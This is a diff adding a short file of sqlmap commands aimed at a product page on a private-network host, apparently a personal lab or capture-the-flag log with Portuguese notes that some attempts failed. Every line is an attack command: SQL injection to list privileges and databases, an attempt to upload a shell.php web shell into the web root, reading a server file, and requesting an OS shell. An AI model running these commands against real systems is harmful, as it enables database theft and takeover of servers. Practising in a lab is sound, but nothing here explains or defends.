@@ -1,0 +1,11 @@
+sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u 'http://192.168.56.101/products.php?type=1' --privileges
+
+sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u 'http://192.168.56.101/products.php?type=1' --dbs
+
+sqlmap -u 'http://192.168.56.101/products.php?type=1' --file-write='/home/orlando/Desktop/shell.php' --file-dest='/var/www/html/shell.php' --batch  >> n funcionou
+
+sqlmap -u http://192.168.56.101/products.php?type=1 --file-read=/var/www/html/index.php --batch >> n funcionou
+
+sqlmap -u http://192.168.56.101/products.php?type=1 --current-user >> n funcionou
+
+sqlmap -u http://192.168.56.101/products.php?type=1 --dbs --os-shell >> n funcionou
